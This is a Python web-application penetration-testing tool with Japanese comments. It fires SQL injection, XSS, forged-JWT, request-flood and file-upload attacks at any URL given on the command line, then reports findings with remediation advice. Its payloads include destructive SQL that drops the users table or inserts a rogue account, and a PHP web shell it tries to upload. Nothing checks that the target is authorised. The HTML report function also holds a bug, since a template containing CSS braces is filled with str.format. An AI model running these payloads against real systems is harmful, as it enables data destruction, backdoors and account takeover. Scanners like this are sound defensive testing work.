#!/usr/bin/env python3
"""
Penetration Testing Utilities
ペネトレーションテストユーティリティ

自動化されたセキュリティテスト実行ツール
- OWASP Top 10対応のテストケース
- 自動攻撃シミュレーション
- 脆弱性検証
- レポート生成
"""

import asyncio
import json
import time
import random
import string
import hashlib
import base64
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urljoin, quote
import logging
import httpx
from concurrent.futures import ThreadPoolExecutor
import sys
from pathlib import Path

# ログ設定
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


@dataclass
class PenTestResult:
    """ペネトレーションテスト結果"""
    test_name: str
    target_url: str
    vulnerability_found: bool
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    attack_vector: str
    payload: str
    response_status: int
    response_headers: Dict[str, str]
    response_body: str
    risk_description: str
    remediation: str
    timestamp: float


class SQLInjectionTester:
    """SQLインジェクションテスト"""

    PAYLOADS = [
        # Basic SQL injection
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT null--",

        # Error-based injection
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",

        # Time-based blind injection
        "' AND (SELECT SLEEP(5))--",
        "'; WAITFOR DELAY '00:00:05'--",

        # Boolean-based blind injection
        "' AND ASCII(SUBSTRING((SELECT version()),1,1))>64--",

        # Union-based injection
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT 1,2,3,4,version()--",

        # Stacked queries
        "'; DROP TABLE users; --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",

        # NoSQL injection (for MongoDB)
        "' || '1'=='1",
        "' && '1'=='1",

        # Advanced payloads
        "' OR BENCHMARK(5000000,MD5(1))--",
        "' OR pg_sleep(5)--",
        "' OR (SELECT COUNT(*) FROM sysobjects)>0--"
    ]

    @staticmethod
    async def test_sql_injection(client: httpx.AsyncClient, base_url: str, endpoints: List[str]) -> List[PenTestResult]:
        """SQLインジェクションテストを実行"""
        results = []

        for endpoint in endpoints:
            for payload in SQLInjectionTester.PAYLOADS:
                # GET parameters
                url_with_payload = f"{base_url}{endpoint}?id={quote(payload)}"
                result = await SQLInjectionTester._test_endpoint_sql(
                    client, url_with_payload, "GET", None, payload
                )
                if result:
                    results.append(result)

                # POST data
                post_data = {"id": payload, "email": f"test{payload}@example.com"}
                result = await SQLInjectionTester._test_endpoint_sql(
                    client, f"{base_url}{endpoint}", "POST", post_data, payload
                )
                if result:
                    results.append(result)

                # JSON data
                json_data = {"search": payload, "filter": payload}
                result = await SQLInjectionTester._test_endpoint_sql(
                    client, f"{base_url}{endpoint}", "POST", json_data, payload, is_json=True
                )
                if result:
                    results.append(result)

        return results

    @staticmethod
    async def _test_endpoint_sql(
        client: httpx.AsyncClient,
        url: str,
        method: str,
        data: Optional[Dict],
        payload: str,
        is_json: bool = False
    ) -> Optional[PenTestResult]:
        """個別エンドポイントのSQLインジェクションテスト"""
        try:
            start_time = time.time()

            if method == "GET":
                response = await client.get(url, timeout=10.0)
            else:
                if is_json:
                    response = await client.post(url, json=data, timeout=10.0)
                else:
                    response = await client.post(url, data=data, timeout=10.0)

            response_time = time.time() - start_time

            # 脆弱性の検出
            vulnerability_indicators = [
                "sql syntax error",
                "mysql_fetch",
                "ora-",
                "postgresql error",
                "sqlite3",
                "syntax error",
                "unclosed quotation mark",
                "quoted string not properly terminated",
                "invalid query",
                "mysql_error",
                "warning: mysql"
            ]

            response_text = response.text.lower()

            # SQL エラーメッセージの検出
            sql_error_found = any(indicator in response_text for indicator in vulnerability_indicators)

            # タイムベースの検出（5秒以上の遅延）
            time_based_detection = response_time > 5.0 and "sleep" in payload.lower()

            # レスポンスサイズの異常（Union attackの検出）
            size_anomaly = len(response_text) > 10000 and "union" in payload.lower()

            if sql_error_found or time_based_detection or size_anomaly:
                severity = "CRITICAL" if sql_error_found else "HIGH"

                return PenTestResult(
                    test_name="SQL Injection",
                    target_url=url,
                    vulnerability_found=True,
                    severity=severity,
                    attack_vector="SQL Injection",
                    payload=payload,
                    response_status=response.status_code,
                    response_headers=dict(response.headers),
                    response_body=response_text[:1000],  # 最初の1000文字のみ
                    risk_description="SQL injection vulnerability allows attackers to manipulate database queries",
                    remediation="Use parameterized queries, input validation, and least privilege database access",
                    timestamp=time.time()
                )

        except Exception as e:
            logger.debug(f"SQL injection test error for {url}: {e}")

        return None


class XSSTester:
    """クロスサイトスクリプティング（XSS）テスト"""

    PAYLOADS = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",

        # Advanced XSS
        "javascript:alert('XSS')",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "<input type=\"image\" src=\"x\" onerror=\"alert('XSS')\">",

        # Event handlers
        "<body onload=alert('XSS')>",
        "<div onmouseover=\"alert('XSS')\">test</div>",
        "<a href=\"javascript:alert('XSS')\">click</a>",

        # Filter bypass
        "<scr<script>ipt>alert('XSS')</script>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",

        # DOM-based XSS
        "<img src=\"\" onerror=\"document.write('XSS')\">",
        "<svg/onload=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",  # base64 encoded alert

        # CSS injection
        "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",

        # Protocol-based
        "data:text/html,<script>alert('XSS')</script>",
        "vbscript:msgbox(\"XSS\")"
    ]

    @staticmethod
    async def test_xss(client: httpx.AsyncClient, base_url: str, endpoints: List[str]) -> List[PenTestResult]:
        """XSSテストを実行"""
        results = []

        for endpoint in endpoints:
            for payload in XSSTester.PAYLOADS:
                # GET parameters
                url_with_payload = f"{base_url}{endpoint}?search={quote(payload)}"
                result = await XSSTester._test_endpoint_xss(
                    client, url_with_payload, "GET", None, payload
                )
                if result:
                    results.append(result)

                # POST form data
                post_data = {"comment": payload, "name": f"test{random.randint(1,1000)}"}
                result = await XSSTester._test_endpoint_xss(
                    client, f"{base_url}{endpoint}", "POST", post_data, payload
                )
                if result:
                    results.append(result)

        return results

    @staticmethod
    async def _test_endpoint_xss(
        client: httpx.AsyncClient,
        url: str,
        method: str,
        data: Optional[Dict],
        payload: str
    ) -> Optional[PenTestResult]:
        """個別エンドポイントのXSSテスト"""
        try:
            if method == "GET":
                response = await client.get(url, timeout=10.0)
            else:
                response = await client.post(url, data=data, timeout=10.0)

            response_text = response.text

            # ペイロードが反映されているかチェック
            if payload in response_text:
                # HTMLエスケープされていないかチェック
                dangerous_chars = ["<script>", "<img", "<svg", "javascript:", "onerror=", "onload="]
                unescaped = any(char in response_text for char in dangerous_chars)

                if unescaped:
                    return PenTestResult(
                        test_name="Cross-Site Scripting (XSS)",
                        target_url=url,
                        vulnerability_found=True,
                        severity="HIGH",
                        attack_vector="Reflected XSS",
                        payload=payload,
                        response_status=response.status_code,
                        response_headers=dict(response.headers),
                        response_body=response_text[:1000],
                        risk_description="XSS vulnerability allows attackers to execute malicious scripts in users' browsers",
                        remediation="Implement proper input validation and output encoding",
                        timestamp=time.time()
                    )

        except Exception as e:
            logger.debug(f"XSS test error for {url}: {e}")

        return None


class AuthenticationTester:
    """認証・認可テスト"""

    @staticmethod
    async def test_authentication_bypass(client: httpx.AsyncClient, base_url: str) -> List[PenTestResult]:
        """認証バイパステスト"""
        results = []

        # 認証が必要なエンドポイント
        protected_endpoints = [
            "/admin/",
            "/dashboard/",
            "/api/v1/users/",
            "/profile/",
            "/settings/"
        ]

        for endpoint in protected_endpoints:
            # 1. 認証なしでのアクセス
            result = await AuthenticationTester._test_unauthorized_access(
                client, f"{base_url}{endpoint}"
            )
            if result:
                results.append(result)

            # 2. 無効なトークンでのアクセス
            result = await AuthenticationTester._test_invalid_token_access(
                client, f"{base_url}{endpoint}"
            )
            if result:
                results.append(result)

            # 3. 期限切れトークンでのアクセス
            result = await AuthenticationTester._test_expired_token_access(
                client, f"{base_url}{endpoint}"
            )
            if result:
                results.append(result)

        return results

    @staticmethod
    async def _test_unauthorized_access(client: httpx.AsyncClient, url: str) -> Optional[PenTestResult]:
        """認証なしアクセステスト"""
        try:
            response = await client.get(url, timeout=10.0)

            # 200 OKが返される場合、認証バイパスの可能性
            if response.status_code == 200:
                return PenTestResult(
                    test_name="Authentication Bypass",
                    target_url=url,
                    vulnerability_found=True,
                    severity="CRITICAL",
                    attack_vector="Missing Authentication",
                    payload="No authentication token",
                    response_status=response.status_code,
                    response_headers=dict(response.headers),
                    response_body=response.text[:500],
                    risk_description="Protected endpoint accessible without authentication",
                    remediation="Implement proper authentication checks for all protected endpoints",
                    timestamp=time.time()
                )

        except Exception as e:
            logger.debug(f"Unauthorized access test error for {url}: {e}")

        return None

    @staticmethod
    async def _test_invalid_token_access(client: httpx.AsyncClient, url: str) -> Optional[PenTestResult]:
        """無効なトークンアクセステスト"""
        try:
            # 無効なJWTトークンを生成
            invalid_tokens = [
                "Bearer invalid.token.here",
                "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",
                "Bearer " + "x" * 200,  # 異常に長いトークン
                "Bearer null",
                "Bearer undefined"
            ]

            for token in invalid_tokens:
                response = await client.get(
                    url,
                    headers={"Authorization": token},
                    timeout=10.0
                )

                # 無効なトークンで200が返される場合は脆弱性
                if response.status_code == 200:
                    return PenTestResult(
                        test_name="Invalid Token Bypass",
                        target_url=url,
                        vulnerability_found=True,
                        severity="HIGH",
                        attack_vector="Invalid JWT Token",
                        payload=token,
                        response_status=response.status_code,
                        response_headers=dict(response.headers),
                        response_body=response.text[:500],
                        risk_description="Invalid JWT token accepted by the application",
                        remediation="Implement proper JWT token validation",
                        timestamp=time.time()
                    )

        except Exception as e:
            logger.debug(f"Invalid token test error for {url}: {e}")

        return None

    @staticmethod
    async def _test_expired_token_access(client: httpx.AsyncClient, url: str) -> Optional[PenTestResult]:
        """期限切れトークンアクセステスト"""
        try:
            # 明らかに期限切れのトークンを作成
            expired_payload = {
                "sub": "test_user",
                "exp": int(time.time()) - 3600,  # 1時間前に期限切れ
                "iat": int(time.time()) - 7200   # 2時間前に発行
            }

            # 簡易的な期限切れトークン（実際のシークレットキーは不明なので検証はスキップされることを期待）
            expired_token = "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0X3VzZXIiLCJleHAiOjE2MzAwMDAwMDAsImlhdCI6MTYzMDAwMDAwMH0.expired"

            response = await client.get(
                url,
                headers={"Authorization": expired_token},
                timeout=10.0
            )

            if response.status_code == 200:
                return PenTestResult(
                    test_name="Expired Token Acceptance",
                    target_url=url,
                    vulnerability_found=True,
                    severity="HIGH",
                    attack_vector="Expired JWT Token",
                    payload=expired_token,
                    response_status=response.status_code,
                    response_headers=dict(response.headers),
                    response_body=response.text[:500],
                    risk_description="Expired JWT token accepted by the application",
                    remediation="Implement proper token expiration validation",
                    timestamp=time.time()
                )

        except Exception as e:
            logger.debug(f"Expired token test error for {url}: {e}")

        return None


class RateLimitTester:
    """レート制限テスト"""

    @staticmethod
    async def test_rate_limiting(client: httpx.AsyncClient, base_url: str) -> List[PenTestResult]:
        """レート制限テスト"""
        results = []

        test_endpoints = [
            "/api/v1/auth/login",
            "/api/v1/users/",
            "/api/v1/jobs/",
        ]

        for endpoint in test_endpoints:
            result = await RateLimitTester._test_endpoint_rate_limit(
                client, f"{base_url}{endpoint}"
            )
            if result:
                results.append(result)

        return results

    @staticmethod
    async def _test_endpoint_rate_limit(client: httpx.AsyncClient, url: str) -> Optional[PenTestResult]:
        """個別エンドポイントのレート制限テスト"""
        try:
            # 短時間に大量のリクエストを送信
            request_count = 100
            success_count = 0

            start_time = time.time()

            for i in range(request_count):
                try:
                    response = await client.get(url, timeout=5.0)
                    if response.status_code != 429:  # 429: Too Many Requests
                        success_count += 1
                except:
                    pass

            end_time = time.time()

            # レート制限が働いていない場合（90%以上のリクエストが成功）
            if success_count / request_count > 0.9:
                return PenTestResult(
                    test_name="Rate Limiting Bypass",
                    target_url=url,
                    vulnerability_found=True,
                    severity="MEDIUM",
                    attack_vector="Rate Limit Bypass",
                    payload=f"{request_count} requests in {end_time - start_time:.2f} seconds",
                    response_status=200,
                    response_headers={},
                    response_body=f"Successfully sent {success_count}/{request_count} requests",
                    risk_description="Rate limiting not properly implemented, allowing DoS attacks",
                    remediation="Implement proper rate limiting to prevent abuse",
                    timestamp=time.time()
                )

        except Exception as e:
            logger.debug(f"Rate limit test error for {url}: {e}")

        return None


class FileUploadTester:
    """ファイルアップロードテスト"""

    @staticmethod
    async def test_file_upload_vulnerabilities(client: httpx.AsyncClient, base_url: str) -> List[PenTestResult]:
        """ファイルアップロード脆弱性テスト"""
        results = []

        upload_endpoints = [
            "/api/v1/upload/",
            "/upload/",
            "/files/upload",
        ]

        for endpoint in upload_endpoints:
            # 悪意のあるファイルアップロードテスト
            malicious_files = [
                ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
                ("script.js", "alert('XSS')", "application/javascript"),
                ("test.exe", "MZ\x90\x00" + "A" * 100, "application/octet-stream"),
                ("huge.txt", "A" * (10 * 1024 * 1024), "text/plain"),  # 10MB file
            ]

            for filename, content, content_type in malicious_files:
                result = await FileUploadTester._test_malicious_upload(
                    client, f"{base_url}{endpoint}", filename, content, content_type
                )
                if result:
                    results.append(result)

        return results

    @staticmethod
    async def _test_malicious_upload(
        client: httpx.AsyncClient,
        url: str,
        filename: str,
        content: str,
        content_type: str
    ) -> Optional[PenTestResult]:
        """悪意のあるファイルアップロードテスト"""
        try:
            files = {"file": (filename, content, content_type)}
            response = await client.post(url, files=files, timeout=30.0)

            # アップロードが成功した場合（特に実行可能ファイル）
            if response.status_code in [200, 201] and filename.endswith(('.php', '.exe', '.jsp')):
                return PenTestResult(
                    test_name="Malicious File Upload",
                    target_url=url,
                    vulnerability_found=True,
                    severity="CRITICAL",
                    attack_vector="Unrestricted File Upload",
                    payload=f"Uploaded {filename} ({content_type})",
                    response_status=response.status_code,
                    response_headers=dict(response.headers),
                    response_body=response.text[:500],
                    risk_description="Server accepts potentially dangerous file uploads",
                    remediation="Implement file type validation, virus scanning, and execute restrictions",
                    timestamp=time.time()
                )

        except Exception as e:
            logger.debug(f"File upload test error for {url}: {e}")

        return None


class PenetrationTester:
    """メインペネトレーションテストクラス"""

    def __init__(self, base_url: str, max_concurrent: int = 10):
        self.base_url = base_url.rstrip('/')
        self.max_concurrent = max_concurrent
        self.results: List[PenTestResult] = []

    async def run_comprehensive_test(self) -> Dict[str, Any]:
        """包括的ペネトレーションテストを実行"""
        logger.info(f"Starting penetration test against {self.base_url}")

        # HTTP client設定
        timeout = httpx.Timeout(10.0, connect=5.0)
        limits = httpx.Limits(max_connections=self.max_concurrent)

        async with httpx.AsyncClient(timeout=timeout, limits=limits) as client:
            # 各テストを実行
            test_tasks = [
                self._run_sql_injection_tests(client),
                self._run_xss_tests(client),
                self._run_authentication_tests(client),
                self._run_rate_limit_tests(client),
                self._run_file_upload_tests(client),
            ]

            # 並行実行
            test_results = await asyncio.gather(*test_tasks, return_exceptions=True)

            # 結果をまとめる
            for result in test_results:
                if isinstance(result, list):
                    self.results.extend(result)
                elif isinstance(result, Exception):
                    logger.error(f"Test failed: {result}")

        return self._generate_report()

    async def _run_sql_injection_tests(self, client: httpx.AsyncClient) -> List[PenTestResult]:
        """SQLインジェクションテスト実行"""
        logger.info("Running SQL injection tests...")
        endpoints = [
            "/api/v1/users/",
            "/api/v1/jobs/",
            "/api/v1/scores/",
            "/search",
            "/login"
        ]
        return await SQLInjectionTester.test_sql_injection(client, self.base_url, endpoints)

    async def _run_xss_tests(self, client: httpx.AsyncClient) -> List[PenTestResult]:
        """XSSテスト実行"""
        logger.info("Running XSS tests...")
        endpoints = [
            "/search",
            "/comments",
            "/profile",
            "/contact"
        ]
        return await XSSTester.test_xss(client, self.base_url, endpoints)

    async def _run_authentication_tests(self, client: httpx.AsyncClient) -> List[PenTestResult]:
        """認証テスト実行"""
        logger.info("Running authentication tests...")
        return await AuthenticationTester.test_authentication_bypass(client, self.base_url)

    async def _run_rate_limit_tests(self, client: httpx.AsyncClient) -> List[PenTestResult]:
        """レート制限テスト実行"""
        logger.info("Running rate limit tests...")
        return await RateLimitTester.test_rate_limiting(client, self.base_url)

    async def _run_file_upload_tests(self, client: httpx.AsyncClient) -> List[PenTestResult]:
        """ファイルアップロードテスト実行"""
        logger.info("Running file upload tests...")
        return await FileUploadTester.test_file_upload_vulnerabilities(client, self.base_url)

    def _generate_report(self) -> Dict[str, Any]:
        """テストレポートを生成"""
        vulnerabilities_found = [r for r in self.results if r.vulnerability_found]

        severity_counts = {
            'CRITICAL': len([r for r in vulnerabilities_found if r.severity == 'CRITICAL']),
            'HIGH': len([r for r in vulnerabilities_found if r.severity == 'HIGH']),
            'MEDIUM': len([r for r in vulnerabilities_found if r.severity == 'MEDIUM']),
            'LOW': len([r for r in vulnerabilities_found if r.severity == 'LOW']),
        }

        attack_vector_counts = {}
        for result in vulnerabilities_found:
            attack_vector_counts[result.attack_vector] = attack_vector_counts.get(result.attack_vector, 0) + 1

        risk_score = self._calculate_risk_score(severity_counts)

        return {
            'test_timestamp': time.time(),
            'target_url': self.base_url,
            'total_tests': len(self.results),
            'vulnerabilities_found': len(vulnerabilities_found),
            'severity_breakdown': severity_counts,
            'attack_vector_breakdown': attack_vector_counts,
            'risk_score': risk_score,
            'results': [asdict(r) for r in self.results],
            'executive_summary': self._generate_executive_summary(severity_counts, risk_score),
            'recommendations': self._generate_recommendations()
        }

    def _calculate_risk_score(self, severity_counts: Dict[str, int]) -> float:
        """リスクスコアを計算（0-100）"""
        weights = {'CRITICAL': 40, 'HIGH': 25, 'MEDIUM': 10, 'LOW': 5}

        total_risk = sum(severity_counts[severity] * weight for severity, weight in weights.items())

        # 正規化（最大リスクを100として）
        max_possible_risk = 100
        risk_score = min(100, (total_risk / max_possible_risk) * 100)

        return round(risk_score, 2)

    def _generate_executive_summary(self, severity_counts: Dict[str, int], risk_score: float) -> str:
        """エグゼクティブサマリーを生成"""
        total_critical_high = severity_counts['CRITICAL'] + severity_counts['HIGH']

        if total_critical_high == 0:
            return "No critical or high-severity vulnerabilities detected. The application shows good security posture."
        elif total_critical_high <= 2:
            return f"Few high-impact vulnerabilities detected (Risk Score: {risk_score}). Immediate attention required for critical issues."
        else:
            return f"Multiple high-impact vulnerabilities detected (Risk Score: {risk_score}). Urgent security remediation required."

    def _generate_recommendations(self) -> List[str]:
        """推奨事項を生成"""
        recommendations = []

        vulnerabilities = [r for r in self.results if r.vulnerability_found]

        # 攻撃ベクター別の推奨事項
        attack_vectors = {r.attack_vector for r in vulnerabilities}

        if 'SQL Injection' in attack_vectors:
            recommendations.append("🛡️ Implement parameterized queries and input validation to prevent SQL injection")

        if 'Reflected XSS' in attack_vectors:
            recommendations.append("🛡️ Implement proper output encoding and Content Security Policy (CSP)")

        if 'Missing Authentication' in attack_vectors:
            recommendations.append("🔐 Implement proper authentication for all protected endpoints")

        if 'Rate Limit Bypass' in attack_vectors:
            recommendations.append("⏱️ Implement proper rate limiting to prevent DoS attacks")

        if 'Unrestricted File Upload' in attack_vectors:
            recommendations.append("📁 Implement file type validation and virus scanning for uploads")

        # 一般的な推奨事項
        recommendations.extend([
            "🔍 Conduct regular security audits and penetration testing",
            "📚 Train development team on secure coding practices",
            "🛠️ Implement automated security testing in CI/CD pipeline",
            "📊 Set up security monitoring and alerting"
        ])

        return recommendations


async def main():
    """メイン実行関数"""
    import argparse

    parser = argparse.ArgumentParser(description='Penetration Testing Tool')
    parser.add_argument('--target', required=True, help='Target URL (e.g., http://localhost:8000)')
    parser.add_argument('--output', default='pentest_report.json', help='Output file')
    parser.add_argument('--concurrent', type=int, default=10, help='Max concurrent requests')
    parser.add_argument('--format', choices=['json', 'html'], default='json', help='Output format')

    args = parser.parse_args()

    # ペネトレーションテスト実行
    tester = PenetrationTester(args.target, args.concurrent)
    results = await tester.run_comprehensive_test()

    # レポート出力
    if args.format == 'json':
        with open(args.output, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
    else:
        await generate_html_pentest_report(results, args.output)

    # サマリー表示
    print(f"\nPenetration Test Results for {args.target}")
    print("=" * 50)
    print(f"Total Tests: {results['total_tests']}")
    print(f"Vulnerabilities Found: {results['vulnerabilities_found']}")
    print(f"Risk Score: {results['risk_score']}/100")
    print("\nSeverity Breakdown:")
    for severity, count in results['severity_breakdown'].items():
        if count > 0:
            print(f"  {severity}: {count}")

    print(f"\nDetailed report saved to: {args.output}")

    # 脆弱性が見つかった場合は警告で終了
    if results['vulnerabilities_found'] > 0:
        print("\n⚠️  Vulnerabilities detected! Review the report for details.")
        critical_high = results['severity_breakdown']['CRITICAL'] + results['severity_breakdown']['HIGH']
        if critical_high > 0:
            sys.exit(1)


async def generate_html_pentest_report(results: Dict[str, Any], output_file: str):
    """HTML形式のペネトレーションテストレポート生成"""
    html_template = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Penetration Test Report</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .header { background-color: #f44336; color: white; padding: 20px; border-radius: 5px; }
            .summary { display: flex; justify-content: space-around; margin: 20px 0; }
            .metric { text-align: center; padding: 15px; background-color: #f9f9f9; border-radius: 5px; }
            .vulnerability { margin: 15px 0; padding: 15px; border-left: 4px solid #ccc; }
            .critical { border-left-color: #d32f2f; background-color: #ffebee; }
            .high { border-left-color: #f57c00; background-color: #fff3e0; }
            .medium { border-left-color: #fbc02d; background-color: #fffde7; }
            .low { border-left-color: #388e3c; background-color: #e8f5e8; }
            .recommendations { background-color: #e3f2fd; padding: 15px; border-radius: 5px; margin: 20px 0; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🔴 Penetration Test Report</h1>
            <p>Target: {target}</p>
            <p>Generated: {timestamp}</p>
            <p>Risk Score: <strong>{risk_score}/100</strong></p>
        </div>

        <div class="summary">
            <div class="metric">
                <h3>{critical}</h3>
                <p>Critical</p>
            </div>
            <div class="metric">
                <h3>{high}</h3>
                <p>High</p>
            </div>
            <div class="metric">
                <h3>{medium}</h3>
                <p>Medium</p>
            </div>
            <div class="metric">
                <h3>{low}</h3>
                <p>Low</p>
            </div>
        </div>

        <div class="recommendations">
            <h2>🛡️ Recommendations</h2>
            <ul>
                {recommendations_html}
            </ul>
        </div>

        <h2>🔍 Detailed Findings</h2>
        {vulnerabilities_html}
    </body>
    </html>
    """

    vulnerabilities_html = ""
    vulnerabilities = [r for r in results['results'] if r['vulnerability_found']]

    for vuln in vulnerabilities:
        severity_class = vuln['severity'].lower()
        vulnerabilities_html += f"""
        <div class="vulnerability {severity_class}">
            <h3>🚨 {vuln['test_name']}</h3>
            <p><strong>Severity:</strong> {vuln['severity']}</p>
            <p><strong>Target:</strong> {vuln['target_url']}</p>
            <p><strong>Attack Vector:</strong> {vuln['attack_vector']}</p>
            <p><strong>Payload:</strong> <code>{vuln['payload']}</code></p>
            <p><strong>Risk:</strong> {vuln['risk_description']}</p>
            <p><strong>Remediation:</strong> {vuln['remediation']}</p>
        </div>
        """

    recommendations_html = ""
    for rec in results['recommendations']:
        recommendations_html += f"<li>{rec}</li>"

    html_content = html_template.format(
        target=results['target_url'],
        timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
        risk_score=results['risk_score'],
        critical=results['severity_breakdown']['CRITICAL'],
        high=results['severity_breakdown']['HIGH'],
        medium=results['severity_breakdown']['MEDIUM'],
        low=results['severity_breakdown']['LOW'],
        recommendations_html=recommendations_html,
        vulnerabilities_html=vulnerabilities_html
    )

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(html_content)


if __name__ == "__main__":
    asyncio.run(main())